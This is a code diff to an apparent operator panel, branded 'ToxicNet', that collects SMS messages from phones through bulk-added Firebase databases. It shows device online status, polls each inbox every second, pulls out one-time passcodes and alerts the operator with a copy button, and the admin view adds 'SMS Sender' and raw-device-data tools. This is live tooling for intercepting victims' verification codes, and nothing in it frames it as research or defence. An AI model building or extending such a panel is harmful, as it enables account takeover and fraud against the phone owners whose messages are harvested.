-.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
-.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
-.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px}
-.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
-.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
-.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
-.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
-.sms-time{font-size:11px;color:#94a3b8;white-space:nowrap}
-.sms-time.fresh{color:#16a34a;font-weight:700}
-.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
-.time-ago.fresh{color:#16a34a}
-.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
-.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
-.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
-.otp-copy-btn:active{transform:scale(.96)}
-.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
-.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#10b981;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
-.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.hidden{display:none !important}
-@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="alex">Personal</span> <span class="panel">OTP</span></div>
-<div class="top-actions">
-<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
-<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-</div>
-<div class="nav"><a href="/" class="nav-link purple">📱 Numbers</a><a href="/otp" class="nav-link active">🔐 Personal OTP</a></div>
-</div>
-
-<div class="container">
-<div id="list-view">
-
-<div class="fb-add-card">
-<h3>➕ Add Your Firebase URL</h3>
-<div class="fb-add-row">
-<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" id="add-btn" onclick="addFirebase()">Add</button>
-<button class="gray" id="bulk-toggle" onclick="toggleBulk()">Bulk</button>
-</div>
-<div id="bulk-area" class="bulk-area">
-<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button onclick="bulkAdd()">📥 Import All</button>
-</div>
-<div id="add-msg" class="fb-msg"></div>
-<div class="my-fb-list" id="my-fb-list"></div>
-</div>
-
-<div class="stats">
-<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
-<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
-<div class="filter-live">
-<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
-<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
-</div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Add a firebase to start...</span></div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
-<div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div>
-<div id="num-list"></div>
-</div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
-<div class="inbox-meta"><span>⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
-</div>
-<div id="top-number-badge" class="top-number-badge hidden">
-<div class="tn-icon">🏆</div>
-<div class="tn-info">
-<div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-const COOKIE_NAME = "alex_personal_firebases_v2";
-let myFirebases = [];
-let allNumbers = [];
-let numbers = [];
-let currentNum = null;
-let refreshTimer = null;
-let lastSig = '';
-let lastInboxSig = '';
-let allInboxMsgs = [];
-let localFilter = 'all';
-let lastOtpSeen = '';
-let notifPermissionAsked = false;
-
-function getCookie(name){
-  const cookies = document.cookie.split(';');
-  for(let c of cookies){
-    c = c.trim();
-    if(c.indexOf(name + '=') === 0){
-      try{ return JSON.parse(decodeURIComponent(c.substring(name.length + 1))); }
-      catch(e){ return []; }
-    }
-  }
-  return [];
-}
-function setCookie(name, value, days){
-  const expires = new Date(Date.now() + days * 864e5).toUTCString();
-  document.cookie = name + '=' + encodeURIComponent(JSON.stringify(value)) + '; expires=' + expires + '; path=/; SameSite=Lax';
-}
-function saveMyFirebases(){ setCookie(COOKIE_NAME, myFirebases, 365); }
-
-function toast(text){
-  const t = document.getElementById('toast');
-  t.textContent = text;
-  t.classList.add('show');
-  setTimeout(()=>t.classList.remove('show'), 2500);
-}
-
-function playOtpSound(){
-  try{
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    [880, 1100, 880].forEach((freq, i) => {
-      const osc = ctx.createOscillator(); const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = freq;
-      const t = ctx.currentTime + i * 0.2;
-      gain.gain.setValueAtTime(0.2, t); gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
-      osc.start(t); osc.stop(t + 0.18);
-    });
-  }catch(e){}
-}
-function askNotificationPermission(){
-  if(notifPermissionAsked) return;
-  notifPermissionAsked = true;
-  if('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
-}
-function showOtpNotification(otp, from, message){
-  toast('🔔 OTP: ' + otp + ' — ' + from);
-  playOtpSound();
-  if('Notification' in window && Notification.permission === 'granted'){
-    try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\n' + message.slice(0, 100), tag: 'otp-' + otp }); setTimeout(()=>n.close(), 10000); }catch(e){}
-  }
-  if(navigator.vibrate){ try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){} }
-}
-
-async function checkConn(){
-  try{
-    const r = await fetch('/api/conn'); const d = await r.json();
-    const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
-    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
-  }catch(e){}
-}
-
-async function manualRefresh(){
-  const btn = document.getElementById('refresh-btn');
-  btn.classList.add('spinning');
-  toast('🔄 Refreshing...');
-  if(myFirebases.length > 0){ await loadNumbers(); }
-  setTimeout(()=>btn.classList.remove('spinning'), 1200);
-}
-
-function renderMyFirebases(){
-  const box = document.getElementById('my-fb-list');
-  if(myFirebases.length === 0){ box.innerHTML = ''; return; }
-  box.innerHTML = myFirebases.map((fb, i) => `
-    <div class="my-fb-card">
-      <div class="fb-icon">🔥</div>
-      <div class="fb-info">
-        <div class="fb-label">Firebase #${i+1}</div>
-        <div class="fb-hash">ID: ${escapeHtml(fb.hash || 'hidden')}</div>
-      </div>
-      <div class="fb-actions"><button onclick="removeFirebase(${i})">🗑 Remove</button></div>
-    </div>
-  `).join('');
-}
-
-function toggleBulk(){
-  const a = document.getElementById('bulk-area');
-  a.style.display = (a.style.display === 'block') ? 'none' : 'block';
-}
-
-async function addFirebase(){
-  const input = document.getElementById('fb-url');
-  let url = input.value.trim();
-  if(!url){ showMsg('add-msg','❌ URL required','err'); return; }
-  if(!url.startsWith('http')) url = 'https://' + url;
-  url = url.replace(/\/+$/, '');
-  if(!url.includes('firebase')){ showMsg('add-msg','❌ Invalid firebase URL','err'); return; }
-  if(myFirebases.some(f => f.url === url)){ showMsg('add-msg','⚠️ Already added','err'); return; }
-
-  document.getElementById('add-btn').disabled = true;
-  showMsg('add-msg','⏳ Adding...','ok');
-
-  try{
-    const r = await fetch('/api/otp/add', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({url: url})
-    });
-    const d = await r.json();
-    if(d.success){
-      myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
-      saveMyFirebases();
-      input.value = '';
-      showMsg('add-msg','✅ Added (URL hidden for security)','ok');
-      renderMyFirebases();
-      loadNumbers();
-    } else {
-      showMsg('add-msg','❌ ' + (d.error || 'Error'), 'err');
-    }
-  }catch(e){
-    showMsg('add-msg','❌ Network error','err');
-  }
-  document.getElementById('add-btn').disabled = false;
-}
-
-async function bulkAdd(){
-  const txt = document.getElementById('fb-bulk').value.trim();
-  if(!txt){ showMsg('add-msg','❌ Empty','err'); return; }
-
-  const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http') || l.includes('firebase'));
-  if(!urls.length){ showMsg('add-msg','❌ No valid URLs','err'); return; }
-
-  showMsg('add-msg', `⏳ Adding ${urls.length}...`, 'ok');
-  let added = 0, skipped = 0, failed = 0;
-
-  for(let i=0; i<urls.length; i++){
-    let url = urls[i].trim();
-    if(!url.startsWith('http')) url = 'https://' + url;
-    url = url.replace(/\/+$/, '');
-    if(!url.includes('firebase')){ failed++; continue; }
-    if(myFirebases.some(f => f.url === url)){ skipped++; continue; }
-
-    try{
-      const r = await fetch('/api/otp/add', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({url: url})
-      });
-      const d = await r.json();
-      if(d.success){
-        myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
-        added++;
-      } else { failed++; }
-    }catch(e){ failed++; }
-
-    showMsg('add-msg', `⏳ ${i+1}/${urls.length}`, 'ok');
-  }
-
-  saveMyFirebases();
-  renderMyFirebases();
-  document.getElementById('fb-bulk').value = '';
-  document.getElementById('bulk-area').style.display = 'none';
-  showMsg('add-msg', `✅ Added: ${added} · Skip: ${skipped} · Fail: ${failed}`, 'ok');
-  loadNumbers();
-}
-
-function showMsg(id, text, type){
-  const el = document.getElementById(id);
-  el.className = 'fb-msg ' + type;
-  el.textContent = text;
-  if(type === 'ok') setTimeout(()=>{ if(el.textContent.includes('✅')) el.className = 'fb-msg'; }, 4000);
-}
-
-function removeFirebase(idx){
-  if(!confirm('Remove this firebase from YOUR browser?')) return;
-  myFirebases.splice(idx, 1);
-  saveMyFirebases();
-  renderMyFirebases();
-  if(myFirebases.length === 0){
-    allNumbers = []; numbers = [];
-    document.getElementById('list-content').classList.add('hidden');
-    document.getElementById('loading-text').classList.remove('hidden');
-    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
-  } else {
-    loadNumbers();
-  }
-  toast('✅ Removed');
-}
-
-function setLocalFilter(f){
-  if(localFilter === f){ localFilter = 'all'; }
-  else { localFilter = f; }
-  updateFilterButtons();
-  applyLocalFilter();
-  renderNumbers();
-}
-
-function updateFilterButtons(){
-  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
-  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
-  let titleText = '📱 All Numbers';
-  if(localFilter === 'online') titleText = '🟢 Online';
-  else if(localFilter === 'offline') titleText = '🔴 Offline';
-  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
-}
-
-function applyLocalFilter(){
-  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-  else numbers = allNumbers.slice();
-  document.getElementById('num-count').textContent = numbers.length;
-}
-
-async function loadNumbers(){
-  if(myFirebases.length === 0){
-    document.getElementById('list-content').classList.add('hidden');
-    document.getElementById('loading-text').classList.remove('hidden');
-    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
-    return;
-  }
-  document.getElementById('loading-text').classList.remove('hidden');
-  document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>Loading...';
-
-  try{
-    const r = await fetch('/api/otp/data', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({urls: myFirebases.map(f => f.url)})
-    });
-    const d = await r.json();
-    if(!d.success){
-      document.getElementById('loading-msg').textContent = '❌ ' + (d.error || 'Error');
-      return;
-    }
-    allNumbers = d.numbers || [];
-    document.getElementById('s-total').textContent = d.total || 0;
-    document.getElementById('s-online').textContent = d.online || 0;
-    document.getElementById('s-offline').textContent = d.offline || 0;
-    document.getElementById('s-otp').textContent = (d.otp_rate || 0) + '%';
-    document.getElementById('q-dev').textContent = allNumbers.length;
-    document.getElementById('badge-online').textContent = d.online || 0;
-    document.getElementById('badge-offline').textContent = d.offline || 0;
-
-    applyLocalFilter();
-    document.getElementById('loading-text').classList.add('hidden');
-    document.getElementById('list-content').classList.remove('hidden');
-    const sig = allNumbers.length + '|' + (d.online || 0) + '|' + localFilter;
-    if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
-  }catch(e){
-    document.getElementById('loading-msg').textContent = '❌ Network error';
-  }
-}
-
-// ✅ PERSONAL OTP: Raw Data button NAHI
-function renderNumbers(){
-  const q = (document.getElementById('search-num').value || '').toLowerCase();
-  const box = document.getElementById('num-list');
-  const filtered = numbers.filter(n => !q ||
-    (n.number||'').toLowerCase().includes(q) ||
-    (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){
-    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
-    return;
-  }
-  box.innerHTML = filtered.map(n => {
-    const isOnline = n.online === true;
-    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
-    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
-    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'Online' : 'Offline';
-    const titleCls = isUnknown ? 'unknown' : '';
-    return `
-      <div class="num-card">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
-        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
-          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
-          <div class="num-sub">
-            <span class="pill">📨 ${n.msg_count} SMS</span>
-            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
-          </div>
-        </div>
-        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>
-    `;
-  }).join('');
-}
-
-function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-  currentNum = n; lastInboxSig = ''; allInboxMsgs = []; lastOtpSeen = '';
-  askNotificationPermission();
-  document.getElementById('list-view').classList.add('hidden');
-  document.getElementById('inbox-view').classList.remove('hidden');
-  const inboxNumEl = document.getElementById('inbox-num');
-  inboxNumEl.textContent = n.number;
-  if((n.number || '').startsWith('UNKNOWN-')){ inboxNumEl.className = 'inbox-num unknown'; }
-  else { inboxNumEl.className = 'inbox-num'; }
-  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-  await loadInbox(false);
-  if(refreshTimer) clearInterval(refreshTimer);
-  refreshTimer = setInterval(()=>loadInbox(false), 1000);
-}
-
-function findTopNumber(msgs){
-  const counter = {};
-  const senderNums = new Set();
-  msgs.forEach(m => {
-    const from = m.from || '';
-    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => senderNums.add(n));
-  });
-  msgs.forEach(m => {
-    const text = m.message || '';
-    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => {
-      if(senderNums.has(n)) return;
-      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
-      counter[n] = (counter[n] || 0) + 1;
-    });
-  });
-  let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){
-    if(cnt > topCount){ topNum = num; topCount = cnt; }
-  }
-  return topNum ? {number: topNum, count: topCount} : null;
-}
-
-function updateTopNumberBadge(msgs){
-  const badge = document.getElementById('top-number-badge');
-  const top = findTopNumber(msgs);
-  if(top && top.count >= 2){
-    document.getElementById('tn-num').textContent = '📞 ' + top.number;
-    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
-    badge.classList.remove('hidden');
-  } else {
-    badge.classList.add('hidden');
-  }
-}
-
-async function loadInbox(showLoader){
-  if(!currentNum) return;
-  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
-  const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
-  try{
-    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
-    clearTimeout(timeoutId); const d = await r.json();
-    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error || 'Error') + '</div>'; return; }
-    const msgs = d.messages || []; allInboxMsgs = msgs;
-    if(msgs.length > 0){
-      const newest = msgs[0];
-      const newestOtp = newest.otp || extractOtp(newest.message);
-      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message || '').slice(0,40);
-      if(newestOtp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || ''); }
-    }
-    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
-  }catch(e){ clearTimeout(timeoutId); }
-}
-
-function timeAgo(ts, now){
-  if(!ts) return '';
-  const diff = now - ts;
-  if(diff < 10) return 'अभी';
-  if(diff < 60) return `${diff}s पहले`;
-  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
-  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
-  return `${Math.floor(diff/86400)}d पहले`;
-}
-
-function highlightPhoneNumbers(text){
-  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
-}
-
-function renderMessages(){
-  const box = document.getElementById('sms-container');
-  const now = Math.floor(Date.now() / 1000);
-  let msgs = [...allInboxMsgs]
-    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
-    .slice(0, 60);
-  
-  updateTopNumberBadge(msgs);
-  
-  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
-    const otp = m.otp || extractOtp(m.message);
-    let body;
-    if(otp){
-      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
-      body = highlightPhoneNumbers(body);
-    } else {
-      body = highlightPhoneNumbers(escapeHtml(m.message));
-    }
-    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
-    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
-    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
-    const timeStr = m.date_string ? m.date_string : fmtTime(ts); const ago = timeAgo(ts, now);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
-    let typeBadge = '';
-    if(otp) typeBadge = '<span class="msg-type-badge otp">OTP</span>';
-    else if(hasNumber) typeBadge = '<span class="msg-type-badge number">📞 NUM</span>';
-    return `
-      <div class="sms-item ${cls}">
-        ${typeBadge}
-        <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
-          <div style="text-align:right">
-            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
-            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
-          </div>
-        </div>
-        <div class="sms-body">${body}</div>
-        ${copyBtn}
-      </div>
-    `;
-  }).join('') + '</div>';
-}
-
-function backToList(){
-  document.getElementById('inbox-view').classList.add('hidden');
-  document.getElementById('list-view').classList.remove('hidden');
-  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-  currentNum = null;
-}
-
-function extractOtp(text){
-  if(!text) return '';
-  const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
-  if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-  if(m) return m[1];
-  m = t.match(/#(\d{4,8})/);
-  if(m) return m[1];
-  return '';
-}
-
-function fmtTime(ts){
-  if(!ts) return '';
-  try{
-    let t = parseInt(ts);
-    if(t > 1e12) t = Math.floor(t/1000);
-    if(t < 1e9) return String(ts);
-    const d = new Date(t * 1000);
-    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-    return d.toLocaleString('en-IN', opts).replace(',', ' |');
-  }catch(e){ return String(ts); }
-}
-
-function copyOtp(code){
-  const done = ()=>toast('✅ Copied: ' + code);
-  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
-}
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-try{
-  const raw = getCookie(COOKIE_NAME) || getCookie("alex_personal_firebases") || [];
-  if(Array.isArray(raw)){
-    myFirebases = raw.map(x => {
-      if(typeof x === 'string') return {url: x, hash: 'hidden', label: 'Firebase'};
-      return x;
-    });
-  }
-}catch(e){ myFirebases = []; }
-
-renderMyFirebases();
-checkConn();
-if(myFirebases.length > 0) loadNumbers();
-setInterval(checkConn, 8000);
-setInterval(()=>{ if(myFirebases.length > 0 && !currentNum) loadNumbers(); }, 10000);
-</script>
-</body>
-</html>
-"""
-
-
 # ==================== ADMIN DASHBOARD ====================
-# ✅ Admin version: Firebases count + Raw Data button
 ADMIN_DASHBOARD_HTML = USER_DASHBOARD_HTML.replace(
-    '<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>',
-    '<div class="nav"><a href="/admin/dashboard" class="nav-link active">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link">🔒 Security</a></div>'
+    '''<div class="nav">
+  <div class="nav-link active" id="tab-num" onclick="switchTab('num')">📱 Numbers</div>
+  <div class="nav-link" id="tab-sms" onclick="switchTab('sms')">💣 SMS Sender</div>
+  <a href="/otp" class="nav-link" style="text-decoration:none">🔑 Personal OTP</a>
+</div>''',
+    '''<div class="nav">
+  <a href="/supermasteradmin/dashboard" class="nav-link active">📱 Numbers</a>
+  <a href="/supermasteradmin/firebases" class="nav-link">🔥 Firebases</a>
+  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS Logs</a>
+  <a href="/supermasteradmin/security" class="nav-link">🔒 Security</a>
+</div>'''
 ).replace(
-    'Alex</span> <span class="panel">OTP PANEL',
-    'Alex</span> <span class="panel">ADMIN</span><span style="font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700;vertical-align:middle">👑</span>'
+    '<div class="brand">☣️ Toxic<span>Net</span></div>',
+    '<div class="brand">☣️ Toxic<span>Net</span><span style="font-size:10px;background:linear-gradient(135deg,#ef4444,#f59e0b);color:#fff;padding:4px 8px;border-radius:6px;margin-left:8px;font-weight:800;letter-spacing:0.5px">ROOT</span></div>'
 ).replace(
-    '<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>',
-    '''<div class="quick">
-      <div class="info">🔥 Firebases : <b id="q-fb">0</b> &nbsp;·&nbsp; 📱 Numbers : <b id="q-dev">0</b></div>
-      <a href="/firebases" style="padding:10px 16px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;text-decoration:none;border-radius:10px;font-size:12px;font-weight:600;min-height:44px;display:inline-flex;align-items:center">⚙️ Manage</a>
-    </div>'''
-).replace(
-    # ✅ Admin me Raw Data button add karo
-    '''        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>
-    `;
-  }).join('');
-}
-
-function openInboxGlobal(idx){
-  if(idx < 0 || idx >= numbers.length) return;
-  openInbox(numbers[idx]);
-}''',
     '''        <div class="card-actions">
-          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
-        </div>
-        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>
-    `;
-  }).join('');
-}
-
-function openRawData(idx){
-  if(idx < 0 || idx >= numbers.length) return;
-  const n = numbers[idx];
-  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
+          <button class="icon-btn send-btn" onclick="event.stopPropagation();openSendModal('${n.number}', '${n.device_id}', '${n.firebase}')" title="Send SMS">💬</button>
+        </div>''',
+    '''        <div class="card-actions">
+          <button class="icon-btn" onclick="event.stopPropagation();openRawData('${n.device_id}', '${n.firebase}')" title="Raw Data" style="background:#8b5cf6">🔍</button>
+          <button class="icon-btn send-btn" onclick="event.stopPropagation();openSendModal('${n.number}', '${n.device_id}', '${n.firebase}')" title="Send SMS">💬</button>
+        </div>'''
+).replace(
+    '''async function openInbox(num, devId, fbUrl, isOnline){''',
+    '''function openRawData(devId, fbUrl){
+  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(fbUrl) + '&id=' + encodeURIComponent(devId);
   window.open(url, '_blank');
 }
 
-function openInboxGlobal(idx){
-  if(idx < 0 || idx >= numbers.length) return;
-  openInbox(numbers[idx]);
-}'''
+async function openInbox(num, devId, fbUrl, isOnline){'''
 ).replace(
-    # ✅ Admin: loadNumbers me firebase count update
-    '''    document.getElementById('q-dev').textContent = allNumbers.length;''',
-    '''    document.getElementById('q-dev').textContent = allNumbers.length;
-    if(document.getElementById('q-fb')) document.getElementById('q-fb').textContent = d.firebases_total || 0;'''
-).replace(
-    # ✅ Admin ke liye raw-btn CSS add karo
-    '''.arrow{color:#cbd5e1;font-size:20px}''',
-    '''.arrow{color:#cbd5e1;font-size:20px}
-.card-actions{display:flex;gap:6px;flex-shrink:0}
-.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
-.raw-btn:active{transform:scale(.94)}'''
+    '''<div class="list-header">
+        <h2>Numbers</h2>
+        <span class="count" id="num-count">0</span>
+      </div>''',
+    '''<div class="list-header" style="justify-content:space-between">
+        <div style="display:flex;align-items:center;gap:12px">
+          <h2>Numbers</h2>
+          <span class="count" id="num-count">0</span>
+        </div>
